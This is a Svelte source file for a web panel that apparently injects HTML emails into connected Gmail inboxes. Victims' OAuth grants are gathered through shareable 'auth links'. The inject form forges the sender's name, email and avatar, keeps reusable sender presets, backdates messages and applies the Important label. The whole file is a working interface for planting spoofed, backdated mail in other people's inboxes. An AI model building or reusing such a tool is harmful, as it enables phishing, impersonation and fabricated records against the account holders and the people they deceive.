<script lang="ts">
	import { onMount } from 'svelte';
	import {
		AtSign,
		Plus,
		Send,
		RefreshCw,
		Trash2,
		Copy,
		ExternalLink,
		Check,
		X,
		Mail,
		User,
		Image as ImageIcon,
		Calendar,
		AlertCircle,
		Star,
		Bookmark,
		Eye,
		Download
	} from 'lucide-svelte';
	import { toast } from '$lib/stores/toast';

	interface Account {
		id: string;
		label: string;
		email: string;
		connected: boolean;
		ownerUsername: string;
		createdAt: number;
	}
	interface Link {
		id: string;
		label: string;
		oauthState: string;
		used: boolean;
		accountId: string;
		ownerUsername: string;
		createdAt: number;
		authUrl: string;
	}
	interface SenderPreset {
		id: string;
		name: string;
		senderName: string;
		senderEmail: string;
		avatarUrl: string;
		ownerUsername: string;
		createdAt: number;
	}

	let activeTab = $state<'inject' | 'links'>('inject');
	let accounts: Account[] = $state([]);
	let links: Link[] = $state([]);
	let presets: SenderPreset[] = $state([]);
	let oauthConfigured = $state(false);

	// Inject form state
	let selectedAccount = $state('');
	let senderName = $state('');
	let senderEmail = $state('');
	let avatarUrl = $state('');
	let subject = $state('');
	let html = $state('<p>Your message here...</p>');
	let backdate = $state(false);
	let backdateValue = $state('');
	let highPriority = $state(false);
	let important = $state(false);

	// Save preset state
	let showSavePreset = $state(false);
	let presetName = $state('');

	let copiedLink = $state<string | null>(null);

	let newLinkLabel = $state('');
	let creatingLink = $state(false);

	let injecting = $state(false);
	let injectStatus: { ok: boolean; message: string } | null = $state(null);

	let confirmDeleteLink = $state<Link | null>(null);
	let confirmDeleteAccount = $state<Account | null>(null);

	let injectDisabledReason = $derived.by(() => {
		const reasons: string[] = [];
		if (!selectedAccount) reasons.push('select a Gmail account');
		if (!subject.trim()) reasons.push('add a subject');
		if (!html.trim()) reasons.push('add email body HTML');
		return reasons.length === 0 ? '' : `To send: ${reasons.join(', ')}.`;
	});

	function handleEsc(e: KeyboardEvent) {
		if (e.key !== 'Escape') return;
		if (confirmDeleteLink) confirmDeleteLink = null;
		else if (confirmDeleteAccount) confirmDeleteAccount = null;
	}

	async function fetchAll() {
		const [a, l, p] = await Promise.all([
			fetch('/api/gmail/accounts').then((r) => r.json()),
			fetch('/api/gmail/links').then((r) => r.json()),
			fetch('/api/gmail/sender-presets').then((r) => r.json())
		]);
		accounts = a.accounts || [];
		links = l.links || [];
		oauthConfigured = !!l.configured;
		presets = p.presets || [];
		if (!selectedAccount && accounts.length > 0) selectedAccount = accounts[0].id;
	}

	onMount(fetchAll);

	async function createLink() {
		if (!newLinkLabel.trim()) return;
		creatingLink = true;
		try {
			const res = await fetch('/api/gmail/links', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ label: newLinkLabel.trim() })
			});
			if (res.ok) {
				newLinkLabel = '';
				await fetchAll();
			}
		} finally {
			creatingLink = false;
		}
	}

	async function deleteLink(l: Link) {
		confirmDeleteLink = l;
	}

	async function performDeleteLink() {
		if (!confirmDeleteLink) return;
		const link = confirmDeleteLink;
		confirmDeleteLink = null;
		await fetch(`/api/gmail/links/${link.id}`, { method: 'DELETE' });
		await fetchAll();
		toast.success(`Deleted auth link "${link.label}"`);
	}

	async function deleteAccount(a: Account) {
		confirmDeleteAccount = a;
	}

	async function performDeleteAccount() {
		if (!confirmDeleteAccount) return;
		const acc = confirmDeleteAccount;
		confirmDeleteAccount = null;
		await fetch(`/api/gmail/accounts/${acc.id}`, { method: 'DELETE' });
		if (selectedAccount === acc.id) selectedAccount = '';
		await fetchAll();
		toast.success(`Deleted account "${acc.label}"`);
	}

	function copyAuthLink(l: Link) {
		navigator.clipboard?.writeText(l.authUrl);
		copiedLink = l.id;
		toast.success('Auth link copied to clipboard');
		setTimeout(() => (copiedLink = null), 1200);
	}

	async function savePreset() {
		if (!presetName.trim()) return;
		const res = await fetch('/api/gmail/sender-presets', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ name: presetName, senderName, senderEmail, avatarUrl })
		});
		if (res.ok) {
			showSavePreset = false;
			toast.success(`Saved preset "${presetName}"`);
			presetName = '';
			await fetchAll();
		} else {
			toast.error('Failed to save preset');
		}
	}

	function loadPreset(p: SenderPreset) {
		senderName = p.senderName;
		senderEmail = p.senderEmail;
		avatarUrl = p.avatarUrl;
		toast.info(`Loaded preset "${p.name}"`);
	}

	async function deletePreset(p: SenderPreset) {
		await fetch(`/api/gmail/sender-presets/${p.id}`, { method: 'DELETE' });
		await fetchAll();
		toast.success(`Deleted preset "${p.name}"`);
	}

	async function inject() {
		if (!selectedAccount || !subject.trim() || !html.trim()) return;
		injecting = true;
		injectStatus = null;
		try {
			const res = await fetch('/api/gmail/inject', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					accountId: selectedAccount,
					from: { name: senderName || 'Sender', email: senderEmail || 'sender@example.com' },
					subject,
					html,
					backdate: backdate && backdateValue ? new Date(backdateValue).getTime() : undefined,
					priority: highPriority ? 'high' : 'normal',
					important
				})
			});
			const data = await res.json();
			injectStatus = {
				ok: !!data.ok,
				message: data.ok ? `Email injected (id: ${data.messageId || '—'})` : data.error || 'Injection failed'
			};
			setTimeout(() => (injectStatus = null), 8000);
		} finally {
			injecting = false;
		}
	}

	function clearForm() {
		senderName = '';
		senderEmail = '';
		avatarUrl = '';
		subject = '';
		html = '<p>Your message here...</p>';
		backdate = false;
		backdateValue = '';
		highPriority = false;
		important = false;
	}

	function exportAll() {
		const data = JSON.stringify({ accounts, links, presets }, null, 2);
		const blob = new Blob([data], { type: 'application/json' });
		const url = URL.createObjectURL(blob);
		const a = document.createElement('a');
		a.href = url;
		a.download = 'gmail-config.json';
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
		setTimeout(() => URL.revokeObjectURL(url), 1000);
	}

	function fmtDate(ts: number) {
		if (!ts) return '—';
		try { return new Date(ts).toLocaleDateString(); } catch { return '—'; }
	}
</script>

<svelte:head>
	<title>Gmail · Panel</title>
</svelte:head>

<svelte:window onkeydown={handleEsc} />

<div class="p-8 pt-5">
	<div class="mb-5 flex items-center justify-between">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Gmail</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Inject emails directly into any Gmail inbox</p>
		</div>
		<div class="flex items-center gap-2">
			{#if !oauthConfigured}
				<span class="inline-flex items-center gap-1.5 rounded-full border border-amber-500/30 bg-amber-500/10 px-3 py-1 text-[11px] font-medium text-amber-300">
					<AlertCircle size={11} />
					OAuth not configured
				</span>
			{/if}
			<button onclick={exportAll} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
				<Download size={12} />
				Export
			</button>
		</div>
	</div>

	<!-- Tabs -->
	<div class="mb-4 flex items-center gap-1 rounded-xl border border-[var(--border)] bg-[var(--card)] p-1 w-fit">
		<button onclick={() => (activeTab = 'inject')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'inject' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<Mail size={13} />
			Inject
		</button>
		<button onclick={() => (activeTab = 'links')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'links' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<ExternalLink size={13} />
			Auth Links
			<span class="rounded bg-[var(--accent-primary)]/10 px-1.5 py-0.5 text-[10px] font-bold text-[var(--text-accent)]">{links.length}</span>
		</button>
	</div>

	{#if activeTab === 'inject'}
		<div class="grid gap-4 xl:grid-cols-2">
			<!-- LEFT: form -->
			<div class="space-y-4">
				<!-- Target -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-4 py-3">
						<p class="text-sm font-semibold text-[var(--foreground)]">Target Account</p>
						<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Select where to inject the email</p>
					</div>
					<div class="p-4">
						{#if accounts.length === 0}
							<p class="text-xs text-[var(--muted-foreground)]">
								No accounts connected. Use the <button onclick={() => (activeTab = 'links')} class="text-[var(--text-accent)] underline">Auth Links</button> tab to connect a Gmail account.
							</p>
						{:else}
							<select bind:value={selectedAccount} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
								{#each accounts as a}
									<option value={a.id}>{a.label} — {a.email}</option>
								{/each}
							</select>
						{/if}
					</div>
				</div>

				<!-- Sender -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
						<div>
							<p class="text-sm font-semibold text-[var(--foreground)]">Sender Identity</p>
							<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Who the email appears to be from</p>
						</div>
						<div class="flex items-center gap-1">
							{#if presets.length > 0}
								<select aria-label="Load sender preset" onchange={(e) => { const p = presets.find((x) => x.id === (e.target as HTMLSelectElement).value); if (p) loadPreset(p); (e.target as HTMLSelectElement).value = ''; }} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1 text-[11px] text-[var(--foreground)]">
									<option value="">Load preset...</option>
									{#each presets as p}
										<option value={p.id}>{p.name}</option>
									{/each}
								</select>
							{/if}
							<button
								onclick={() => (showSavePreset = true)}
								disabled={!senderEmail.trim() && !senderName.trim()}
								title={!senderEmail.trim() && !senderName.trim()
									? 'Enter a sender name or email first to save a preset'
									: 'Save the current sender as a reusable preset'}
								aria-label="Save current sender as a preset"
								class="flex items-center gap-1 rounded-md border border-[var(--border)] px-2 py-1 text-[11px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
							>
								<Bookmark size={11} aria-hidden="true" />
								Save preset
							</button>
						</div>
					</div>
					<div class="p-4 space-y-3">
						<div class="grid grid-cols-2 gap-3">
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Name</label>
								<input bind:value={senderName} type="text" placeholder="Sender name" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Email</label>
								<input bind:value={senderEmail} type="email" placeholder="name@example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
						</div>
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Avatar URL (optional)</label>
							<input bind:value={avatarUrl} type="text" placeholder="https://..." class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
						</div>
					</div>
				</div>

				<!-- Message -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-4 py-3">
						<p class="text-sm font-semibold text-[var(--foreground)]">Message</p>
						<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Subject and HTML body</p>
					</div>
					<div class="p-4 space-y-3">
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Subject</label>
							<input bind:value={subject} type="text" placeholder="Email subject line" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
						</div>
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">HTML Body</label>
							<textarea bind:value={html} rows={9} placeholder="<p>Your HTML message...</p>" class="w-full resize-y rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"></textarea>
						</div>
					</div>
				</div>

				<!-- Options -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-4 py-3">
						<p class="text-sm font-semibold text-[var(--foreground)]">Options</p>
						<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Date, priority, importance</p>
					</div>
					<div class="p-4 space-y-3">
						<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
							<input type="checkbox" bind:checked={backdate} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							Backdate email
						</label>
						{#if backdate}
							<input bind:value={backdateValue} type="datetime-local" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
						{/if}
						<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
							<input type="checkbox" bind:checked={highPriority} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							High Priority
						</label>
						<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
							<input type="checkbox" bind:checked={important} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							Important (apply IMPORTANT label)
						</label>
					</div>
				</div>

				{#if injectStatus}
					<div class="flex items-center gap-2 rounded-md px-3 py-2 text-xs {injectStatus.ok ? 'bg-[var(--status-live)]/15 text-[var(--status-live)]' : 'bg-[var(--destructive)]/15 text-[var(--destructive)]'}">
						{#if injectStatus.ok}<Check size={13} />{:else}<AlertCircle size={13} />{/if}
						{injectStatus.message}
					</div>
				{/if}

				<div class="flex items-center gap-2">
					<button onclick={clearForm} aria-label="Clear inject form" class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
						<X size={12} aria-hidden="true" />
						Clear
					</button>
					<button
						onclick={inject}
						disabled={injecting || !!injectDisabledReason}
						aria-label="Inject email into Gmail inbox"
						title={injectDisabledReason || 'Inject email into the selected Gmail inbox'}
						class="btn-accent flex flex-1 items-center justify-center gap-1.5 rounded-lg px-4 py-2 text-xs disabled:opacity-50 disabled:cursor-not-allowed"
					>
						{#if injecting}
							<RefreshCw size={12} class="animate-spin" aria-hidden="true" />
							Injecting...
						{:else}
							<Send size={12} aria-hidden="true" />
							Inject Email
						{/if}
					</button>
				</div>
				{#if injectDisabledReason && !injecting}
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">{injectDisabledReason}</p>
				{/if}
			</div>

			<!-- RIGHT: preview -->
			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
				<div class="border-b border-[var(--border)] px-4 py-3 flex items-center gap-2">
					<Eye size={14} class="text-[var(--text-accent)]" />
					<p class="text-sm font-semibold text-[var(--foreground)]">Preview</p>
				</div>
				<div class="border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-4 py-2 text-[11px]">
					<p class="text-[var(--muted-foreground)]">
						<span class="text-[var(--foreground)] font-medium">From:</span> {senderName || 'Sender'} &lt;{senderEmail || 'sender@example.com'}&gt;
					</p>
					<p class="text-[var(--muted-foreground)]">
						<span class="text-[var(--foreground)] font-medium">To:</span> {accounts.find((a) => a.id === selectedAccount)?.email || 'no account selected'}
					</p>
					<p class="text-[var(--muted-foreground)]">
						<span class="text-[var(--foreground)] font-medium">Subject:</span> {subject || '(no subject)'}
					</p>
					{#if highPriority || important}
						<div class="mt-1 flex items-center gap-1">
							{#if highPriority}<span class="rounded bg-amber-500/15 px-1.5 py-0.5 text-[10px] text-amber-300">High Priority</span>{/if}
							{#if important}<span class="rounded bg-[var(--accent-primary)]/15 px-1.5 py-0.5 text-[10px] text-[var(--text-accent)]"><Star size={9} class="inline" /> Important</span>{/if}
						</div>
					{/if}
				</div>
				<div class="bg-white" style="height: 78vh;">
					<iframe srcdoc={html} title="Inject preview" class="h-full w-full border-0" sandbox="allow-same-origin"></iframe>
				</div>
			</div>
		</div>
	{:else}
		<!-- Auth Links tab -->
		<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
			<div class="border-b border-[var(--border)] px-5 py-3 flex flex-wrap items-center justify-between gap-3">
				<div>
					<p class="text-sm font-semibold text-[var(--foreground)]">Auth Links</p>
					<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Generate OAuth links to connect Gmail accounts</p>
				</div>
				<div class="flex items-center gap-2">
					<input bind:value={newLinkLabel} type="text" placeholder="Link label (e.g. John's Gmail)" class="w-72 rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
					<button onclick={createLink} disabled={!newLinkLabel.trim() || creatingLink} class="btn-accent flex items-center gap-1.5 px-3 py-2 text-xs disabled:opacity-50">
						<Plus size={12} />
						Create
					</button>
				</div>
			</div>

			{#if !oauthConfigured}
				<div class="border-b border-amber-500/30 bg-amber-500/5 px-5 py-3 text-[11px] text-amber-300">
					<AlertCircle size={11} class="inline mr-1.5" />
					Gmail OAuth credentials are not configured. Auth links can be generated and saved, but the redirect target won't authenticate until you set <code class="rounded bg-amber-500/15 px-1 font-mono">GOOGLE_OAUTH_CLIENT_ID</code> and <code class="rounded bg-amber-500/15 px-1 font-mono">GOOGLE_OAUTH_CLIENT_SECRET</code>.
				</div>
			{/if}

			<!-- Connected accounts -->
			{#if accounts.length > 0}
				<div class="border-b border-[var(--border)] px-5 py-3">
					<p class="mb-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Connected Accounts ({accounts.length})</p>
					<div class="space-y-2">
						{#each accounts as a (a.id)}
							<div class="flex items-center justify-between rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2">
								<div class="min-w-0">
									<p class="truncate text-xs font-semibold text-[var(--foreground)]">{a.label}</p>
									<p class="truncate text-[10px] text-[var(--muted-foreground)]">{a.email}</p>
								</div>
								<div class="flex items-center gap-2">
									<span class="rounded bg-[var(--status-live)]/15 px-2 py-0.5 text-[10px] text-[var(--status-live)]">Connected</span>
									<button onclick={() => deleteAccount(a)} title={`Delete ${a.label}`} class="rounded-md p-1 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label={`Delete connected account ${a.label}`}>
										<Trash2 size={11} aria-hidden="true" />
									</button>
								</div>
							</div>
						{/each}
					</div>
				</div>
			{/if}

			<!-- Auth links -->
			{#if links.length === 0}
				<div class="flex flex-col items-center justify-center py-12 text-center">
					<ExternalLink size={32} class="mb-2 text-[var(--text-tertiary)]" />
					<p class="text-sm font-semibold text-[var(--foreground)]">No auth links yet</p>
					<p class="mt-1 text-xs text-[var(--muted-foreground)]">Create one above to start collecting Gmail OAuth grants.</p>
				</div>
			{:else}
				<div class="divide-y divide-[var(--border-subtle)]">
					{#each links as l (l.id)}
						<div class="flex items-center justify-between gap-3 px-5 py-3 hover:bg-[var(--accent)]/30">
							<div class="min-w-0 flex-1">
								<div class="flex items-center gap-2">
									<p class="truncate text-xs font-semibold text-[var(--foreground)]">{l.label}</p>
									{#if l.used}
										<span class="rounded bg-[var(--status-live)]/15 px-1.5 py-0.5 text-[10px] text-[var(--status-live)]">Used</span>
									{:else}
										<span class="rounded bg-amber-500/15 px-1.5 py-0.5 text-[10px] text-amber-300">Pending</span>
									{/if}
								</div>
								<p class="mt-0.5 truncate text-[10px] text-[var(--muted-foreground)]">Created {fmtDate(l.createdAt)} · state: <code class="font-mono">{l.oauthState.slice(0, 12)}...</code></p>
							</div>
							<div class="flex items-center gap-1">
								<button onclick={() => copyAuthLink(l)} aria-label={`Copy auth link for ${l.label}`} class="flex items-center gap-1 rounded-md border border-[var(--border)] px-2 py-1 text-[11px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									{#if copiedLink === l.id}
										<Check size={11} class="text-[var(--status-live)]" aria-hidden="true" />
										Copied!
									{:else}
										<Copy size={11} aria-hidden="true" />
										Copy link
									{/if}
								</button>
								<a href={l.authUrl} target="_blank" rel="noopener" aria-label={`Open auth link for ${l.label} in new tab`} class="flex items-center gap-1 rounded-md border border-[var(--border)] px-2 py-1 text-[11px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									<ExternalLink size={11} aria-hidden="true" />
									Open
								</a>
								<button onclick={() => deleteLink(l)} title={`Delete ${l.label}`} class="rounded-md p-1 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label={`Delete auth link ${l.label}`}>
									<Trash2 size={11} aria-hidden="true" />
								</button>
							</div>
						</div>
					{/each}
				</div>
			{/if}
		</div>
	{/if}
</div>

{#if showSavePreset}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showSavePreset = false)}>
		<div class="w-full max-w-sm rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-sm font-semibold text-[var(--foreground)]">Save Sender Preset</h3>
			<input bind:value={presetName} type="text" placeholder="Preset name" class="mt-4 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
			<div class="mt-4 flex justify-end gap-2">
				<button onclick={() => (showSavePreset = false)} class="rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={savePreset} disabled={!presetName.trim()} class="btn-accent px-3 py-1.5 text-xs disabled:opacity-50">Save</button>
			</div>
		</div>
	</div>
{/if}

{#if confirmDeleteLink}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-link-delete-title"
		tabindex="-1"
		onclick={() => (confirmDeleteLink = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmDeleteLink = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[var(--destructive)]/15 text-[var(--destructive)]">
					<AlertCircle size={16} />
				</div>
				<div>
					<h3 id="confirm-link-delete-title" class="text-base font-semibold text-[var(--foreground)]">Delete auth link?</h3>
					<p class="mt-2 text-sm text-[var(--muted-foreground)]">
						This will revoke the auth link
						<span class="font-mono text-[var(--foreground)]">{confirmDeleteLink.label}</span>.
						Anyone using it will get an error. This cannot be undone.
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button onclick={() => (confirmDeleteLink = null)} class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={performDeleteLink} class="rounded-lg bg-[var(--destructive)] px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90">Delete link</button>
			</div>
		</div>
	</div>
{/if}

{#if confirmDeleteAccount}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-account-delete-title"
		tabindex="-1"
		onclick={() => (confirmDeleteAccount = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmDeleteAccount = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[var(--destructive)]/15 text-[var(--destructive)]">
					<AlertCircle size={16} />
				</div>
				<div>
					<h3 id="confirm-account-delete-title" class="text-base font-semibold text-[var(--foreground)]">Disconnect Gmail account?</h3>
					<p class="mt-2 text-sm text-[var(--muted-foreground)]">
						This will remove
						<span class="font-mono text-[var(--foreground)]">{confirmDeleteAccount.email}</span>
						from connected accounts. You'll need to re-authorize it to inject again.
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button onclick={() => (confirmDeleteAccount = null)} class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={performDeleteAccount} class="rounded-lg bg-[var(--destructive)] px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90">Disconnect</button>
			</div>
		</div>
	</div>
{/if}
